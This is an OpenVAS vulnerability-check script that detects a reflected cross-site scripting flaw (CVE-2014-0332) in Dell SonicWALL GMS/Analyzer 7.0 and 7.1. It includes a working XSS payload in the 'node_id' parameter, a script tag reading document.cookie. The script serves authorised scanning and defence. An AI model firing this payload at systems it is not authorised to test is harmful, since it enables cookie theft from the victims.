##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_sonicwall_node_id_xss_vuln.nasl 6663 2017-07-11 09:58:05Z teissa $
#
# DELL SonicWALL 'node_id' Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804239";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6663 $");
  script_cve_id("CVE-2014-0332");
  script_bugtraq_id(65498);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-02-17 19:09:31 +0530 (Mon, 17 Feb 2014)");
  script_name("DELL SonicWALL 'node_id' Cross Site Scripting Vulnerability");

  tag_summary =
"This host is running DELL SonicWALL and is prone to cross site scripting
vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it is
able to read the string or not.";

  tag_insight =
"The flaw is due to an input passed via the 'node_id' parameter to
'sgms/mainPage', which is not properly sanitised before using it.";

  tag_impact =
"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials.

Impact Level: Application";

  tag_affected =
"DELL SonicWALL 7.0 and 7.1";

  tag_solution =
"Upgrade to DELL SonicWALL version 7.2 or later.
For updates refer to http://www.sonicwall.com/";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/91062");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125180");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2014/Feb/108");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
dellPort = "";
dellReq = "";
dellRes = "";

## Get HTTP Port
dellPort = get_http_port(default:80);
if(!dellPort){
  dellPort = 80;
}

## Check Port State
if(!get_port_state(dellPort)){
  exit(0);
}

## Send and Receive the response
dellReq = http_get(item:"/sgms/login", port:dellPort);
dellRes = http_keepalive_send_recv(port:dellPort, data:dellReq, bodyonly:TRUE);

## Confirm the application before trying exploit
if(">Dell SonicWALL Analyzer Login<" >< dellRes ||
   ">Dell SonicWALL GMS Login<" >< dellRes)
{
  url = '/sgms/mainPage?node_id=aaaaa";><script>alert(document.cookie);</script>';

  ## Confirm the exploit
  if(http_vuln_check(port:dellPort, url:url, check_header:TRUE,
     pattern:"><script>alert\(document.cookie\);</script>"))
  {
    report = report_vuln_url( port:dellPort, url:url );
    security_message(port:dellPort, data:report);
    exit(0);
  }
}
